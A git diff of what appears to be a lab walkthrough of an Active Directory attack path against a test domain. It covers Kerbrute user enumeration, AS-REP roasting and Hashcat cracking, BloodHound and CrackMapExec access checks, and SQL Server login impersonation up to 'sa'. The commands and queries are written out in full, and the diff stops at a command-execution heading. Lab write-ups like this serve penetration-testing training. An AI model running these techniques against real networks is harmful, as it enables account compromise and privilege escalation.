@@ -8,9 +8,9 @@
 
 **Task: Enumerate valid domain users.**
 
-It is possible to enumerate valid domain users by sending TGT requests with the usernames to the domain controller. One tool which can do this is [Kerbrute](https://github.com/ropnop/kerbrute). But before we can use this tool we need a list of valid usernames which we want to use. A repository with a lot of lists for these kind of things is [SecLists](https://github.com/danielmiessler/SecLists).
+It is possible to enumerate valid domain users by sending TGT requests with the usernames to the domain controller and checking the response. One tool which can do this is [Kerbrute](https://github.com/ropnop/kerbrute). But first we need a list of usernames to spray. A repository with a lot of lists for ethica hacking is [SecLists](https://github.com/danielmiessler/SecLists).
 
-1. Download the required tools:
+1. Download Kerbrute, make it executable and download SecLists:
 
 ```
 wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
@@ -18,7 +18,7 @@ chmod +x kerbrute
 git clone https://github.com/danielmiessler/SecLists
 ```
 
-2\. After downloading the tool and the username list, run Kerbrute against the domain `amsterdam.bank.local` and DC `10.0.0.3`. I like to pipe the command to `tee` to save the output to a text file with the name `username_enum.txt`. The command is:
+2\. After downloading the tools and the username list, run Kerbrute against the domain `amsterdam.bank.local` and DC `10.0.0.3`. I prefer to pipe the command to `tee` to save the output to a text file, in this case `username_enum.txt`. The command is:
 
 ```
 ./kerbrute userenum -d amsterdam.bank.local --dc 10.0.0.3 /opt/SecLists/Usernames/xato-net-10-million-usernames.txt | tee username_enum.txt
@@ -26,7 +26,7 @@ git clone https://github.com/danielmiessler/SecLists
 
 ![](<../../../.gitbook/assets/image (72) (1) (1) (1).png>)
 
-3\. Kerbrute found quite some valid usernames. To only get a list of usernames execute the following which will cut the output and only leave the usernames. Then it changes everything to lowercase and sort for unique entries and write it to `users.txt`:
+3\. Kerbrute found quite some valid usernames. To only get a list of usernames execute the following command which will cut the output and only print the usernames. Then it changes everything to lowercase and sort for unique entries and write it to `users.txt`:
 
 ```
 cat username_enum.txt | grep bank.local | cut -d " " -f 8- | cut -d "@" -f 1 | sed 's/./\L&/g' | sort -u > users.txt
@@ -50,15 +50,17 @@ steve
 thomas
 ```
 
+We succesfully enumerated a list of valid domain users that are part of the domain `amsterdam.bank.local`.
+
 ### 2. AS-REP roast
 
-**Task: Check if any of the valid users are vulnerable to a kerberos vulnerability.**
+**Task: Check if any of the valid users are vulnerable to an kerberos vulnerability.**
 
-One of the vulnerabilities which can be exploited with just a list of usernames without having access to a valid domain user already is checking if any of the users has pre-authentication enabled. If they do we can execute the AS-REP roasting attack and hopefully crack their hash and retrieve a password.
+One of the misconfiguration which can be exploited with just a list of valid domain users and without knowing their password is checking if any of the valid domain users has pre-authentication enabled. If they do we can execute the AS-REP roasting attack and hopefully crack their hash and retrieve a valid password.
 
-Other attacks which are possible to do is password spraying or checking if the user has an empty password. Which won't be covered in this attack path. But its possible to gain access to other users by executing these attacks in the lab.
+Other attacks which are possible to do is password spraying or checking if the user has an empty password. Which won't be covered in this attack path. But its possible to gain access to other users by executing these kind of attacks.
 
-1. We can use the `GetNPUsers.py` script from impacket to check if any of the users have this attribute set and AS-REP roast them, saving the hashes to asreproasting.txt
+1. We can use the [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) script from Impacket to check if any of the users has this attribute set and if they do AS-REP roast them, saving the hashes to `asreproasting.txt`.
 
 ```
 GetNPUsers.py amsterdam/ -dc-ip 10.0.0.3 -usersfile users.txt -format hashcat -outputfile asreproasting.txt
@@ -66,11 +68,11 @@ GetNPUsers.py amsterdam/ -dc-ip 10.0.0.3 -usersfile users.txt -format hashcat -o
 
 ![](<../../../.gitbook/assets/image (9) (1) (1).png>)
 
-2\. The output doesn't show us any successes. But the file `kerberoasting.txt` is there and it has a hash:
+2\. The output doesn't show us any successes. But the file `kerberoasting.txt` is there and it has a hash for the user `richard`:
 
 ![](<../../../.gitbook/assets/image (67) (1).png>)
 
-3\. We can crack the hash with Hashcat. I transfered the file to my host since cracking in a VM isn't really ideal, it can't use the GPU then. I always run hashcat with rockyou and the dive ruleset.
+3\. We can try to crack this hash using [Hashcat](https://hashcat.net/hashcat/). I transferred the file to my host since cracking in a VM isn't really ideal since it doesn't have access to my GPU. I always run Hashcat with rockyou and the dive ruleset first. For AS-REP Roasting we need to use hashmode `-m 18200`.
 
 ```
 .\hashcat.exe -a 0 -m 18200 .\asreproasting.txt .\wordlists\rockyou.txt  -r .\rules\dive.rule
@@ -78,11 +80,11 @@ GetNPUsers.py amsterdam/ -dc-ip 10.0.0.3 -usersfile users.txt -format hashcat -o
 
 ![](<../../../.gitbook/assets/image (34) (1).png>)
 
-4\. I cracked the hash within seconds and we gained access to the domain as `Richard` with the password `Sample123`.
+4\. We cracked the hash within seconds of the domain user `Richard`, the password is `Sample123`.
 
-#### Optional:
+#### Optional gathering BloodHound data of amsterdam.bank.local:
 
-1. After gaining access to a valid set of credentials I always like to run BloodHound immediately. I normally run the PowerShell version of the BloodHound ingestor, but since we don't have access to a machine yet and I'm not connected on my W10 VM to the lab. We can also run the [BloodHound.py](https://github.com/fox-it/BloodHound.py) ingestor from FoxIt.
+1. After gaining access to a valid set of credentials I always prefer to run [BloodHound](https://github.com/BloodHoundAD/BloodHound) immediately. I normally run the PowerShell version of the BloodHound ingestor, but since we don't have access to a machine yet and I'm not connected on my W10 VM to the lab. We can run the [BloodHound.py](https://github.com/fox-it/BloodHound.py) ingestor from FoxIt:
 
 ```
 git clone https://github.com/fox-it/BloodHound.py
@@ -91,11 +93,11 @@ bloodhound-python -d amsterdam.bank.local -ns 10.0.0.3 -dc DC02.amsterdam.bank.l
 
 ![](<../../../.gitbook/assets/image (2) (1).png>)
 
-2\. We now can load the data into BloodHound by draggin the zip file into it and see if Richard can do anything usefull:
+2\. We now can load the data into BloodHound by dragging the zip file into the BloodHound program and see if `Richard` can do anything useful. In the top search for the Richard user and click on it.
 
 ![](<../../../.gitbook/assets/image (62) (1) (1).png>)
 
-Richard is member of the following groups, nothing interesting there:
+If you check Richard their attributes and click on the group memberships it unfolds. Richard is member of the following groups, nothing interesting there:
 
 ![](<../../../.gitbook/assets/image (66) (1) (1).png>)
 
@@ -103,17 +105,19 @@ The attributes of the user also doesn't show anything interesting:
 
 ![](<../../../.gitbook/assets/image (15) (1) (1) (1).png>)
 
+We didn't found anything, but it is always good to check this for every user and computers you own. You can also right click on every object we owned and mark them as "Owned". So its easier to query future attack paths from owned principals.
+
 ### 3. Access SQL Server
 
 **Task: Check if the user can access any system or service.**
 
 #### Checking for access
 
-To check if a user can access any systems I like to use [Crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec). This tool can check if the user can authenticate to a list of targets using smb, winrm, mssql and ldap. It also supports ssh. This is a snippet from the help function:
+To check if a user can access any systems I prefer to use [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec). This tool can easily check if the user can authenticate to a list of targets using either the protocols smb, winrm, mssql or ldap. It also supports ssh. This is a snippet from the help function:
 
 ![](<../../../.gitbook/assets/image (47).png>)
 
-1. We can check if the user can access anything over SMB, which by default a domain user can. If the user is local admin (which is what we need to really do anything over SMB, it will show Pwn3d!).
+1. We can check if the user can access anything over SMB, which by default a normal domain user can authenticate over SMB. If the user is local admin (which is what we need to really do anything over SMB, it will show `Pwn3d!` in orange).
 
 ```
 crackmapexec smb 10.0.0.0/24 -u richard -p Sample123
@@ -121,7 +125,7 @@ crackmapexec smb 10.0.0.0/24 -u richard -p Sample123
 
 ![](<../../../.gitbook/assets/image (56) (1).png>)
 
-It can access three hosts over SMB but unfortunately we aren't local admin to any of them. We can still check for any accessible shares by adding the `--shares` parameter.
+The account can access three hosts over SMB but unfortunately we aren't local admin to any of them. We can still check for any accessible SMB shares by adding the `--shares` parameter.
 
 ```
 crackmapexec smb 10.0.0.3 10.0.0.4 10.0.0.5 -u richard -p Sample123 --shares
@@ -129,11 +133,11 @@ crackmapexec smb 10.0.0.3 10.0.0.4 10.0.0.5 -u richard -p Sample123 --shares
 
 ![](<../../../.gitbook/assets/image (54).png>)
 
-After connecting to the share we see that this user can't access any of the subdirectories:
+The IPC$, NETLOGON and SYSVOL shares are default. There is one interesting share with the name `Data` on `FILE01`. After connecting to the share with smbclient we see that this user unfortunately can't access any of the subdirectories:
 
 ![](<../../../.gitbook/assets/image (73) (1) (1).png>)
 
-2\. Next we can check if the user can access any systems over winrm:
+2\. Next we can check if the user can access any systems with the winrm protocol:
 
 ```
 crackmapexec winrm 10.0.0.0/24 -u richard -p Sample123
@@ -141,7 +145,7 @@ crackmapexec winrm 10.0.0.0/24 -u richard -p Sample123
 
 ![](<../../../.gitbook/assets/image (32) (1).png>)
 
-3\. We weren't able to authenticate to any machine over winrm. Now we check for SQL server with the mssql protocol:
+3\. We weren't able to authenticate to any machine over Winrm. Now we check for SQL server with the mssql protocol:
 
 ```
 crackmapexec mssql 10.0.0.0/24 -u richard -p Sample123
@@ -149,9 +153,9 @@ crackmapexec mssql 10.0.0.0/24 -u richard -p Sample123
 
 ![](<../../../.gitbook/assets/image (15) (1) (1).png>)
 
-Richard can connect to the SQL server running on `WEB01` `10.0.0.5`. But he isn't sysadmin yet.
+Richard can connect to the SQL server running on `WEB01` `10.0.0.5`. But he doesn't have sysadmin rights(otherwise the tool prints Pwn3d!).
 
-4\. We can create a real connection with these credentials and the example script from impacket named [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py).
+4\. We can create a real connection with these credentials and the script [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) from Impacket.&#x20;
 
 ```
 mssqlclient.py -windows-auth 'amsterdam/richard:Sample123'@10.0.0.5
@@ -163,7 +167,7 @@ mssqlclient.py -windows-auth 'amsterdam/richard:Sample123'@10.0.0.5
 
 **Task: Escalate privileges to sysadmin.**
 
-1. With the following queries we can check if our user is sysadmin, although we already know from Crackmapexec that our user probably isn't sysadmin
+1. With the following SQL query we can check if our user is sysadmin, although we already know from CrackMapExec that our user likely isn't sysadmin
 
 ```
 SELECT SYSTEM_USER
@@ -172,7 +176,7 @@ SELECT IS_SRVROLEMEMBER('sysadmin')
 
 ![](<../../../.gitbook/assets/image (29).png>)
 
-2\. The 0 means we aren't sysadmin. So we have to find a way to become sysadmin. One of the ways I know of is checking if our user can impersonate any other user which we can check with the following querie:
+2\. The `0` means that the user `AMSTERDAM\richard` is not sysadmin. So we have to find a way to gain sysadmin privileges. One of the ways I know of is checking if our user can impersonate any other user which we can check with the following SQL query:
 
 ```
 SELECT distinct b.name
@@ -184,13 +188,13 @@ WHERE a.permission_name = 'IMPERSONATE'
 
 ![](<../../../.gitbook/assets/image (14) (1) (1) (1).png>)
 
-3\. Seems like we can impersonate a User with the name Developer. We can do this with the following querie:
+3\. Seems like we can impersonate a user with the name `Developer`. We can do this with the following SQL query:
 
 ```
 EXECUTE AS LOGIN = 'Developer'
 ```
 
-But we get an error, because the user Developer can't use the database we are currently connected to:&#x20;
+But we get an error, because the user `Developer` can't use the database we are currently connected to:&#x20;
 
 ![](<../../../.gitbook/assets/image (45) (1).png>)
 
@@ -212,7 +216,7 @@ SELECT IS_SRVROLEMEMBER('sysadmin')
 
 ![](<../../../.gitbook/assets/image (18) (1) (1).png>)
 
-4\. We impersonated the user Developer but still aren't sysadmin. We can check for impersonation permissions agains with the same query:
+4\. We impersonated the user `Developer` but still aren't sysadmin. We can check for impersonation permissions again with the same query:
 
 ```
 SELECT distinct b.name
@@ -247,7 +251,7 @@ WHERE a.permission_name = 'IMPERSONATE'
 
 ![](<../../../.gitbook/assets/image (36).png>)
 
-7\. Seems like we can finally impersonate `sa` now.
+7\. We aren't sysadmin but it seems we can finally impersonate `sa` now.
 
 ```
 EXECUTE AS LOGIN = 'sa'
@@ -257,7 +261,7 @@ SELECT IS_SRVROLEMEMBER('sysadmin')
 
 ![](<../../../.gitbook/assets/image (61) (1).png>)
 
-8\. We are `sa` and have sysadmin privileges. We successfully escalated our privileges from domain user to `sa` with sysadmin privileges on the SQL Server.
+8\. We are `sa` and have sysadmin privileges. We successfully escalated our privileges from domain user to `sa` with sysadmin privileges on the SQL Server. Now we can try to get command execution on the host.
 
 ### 5. Execute commands
 
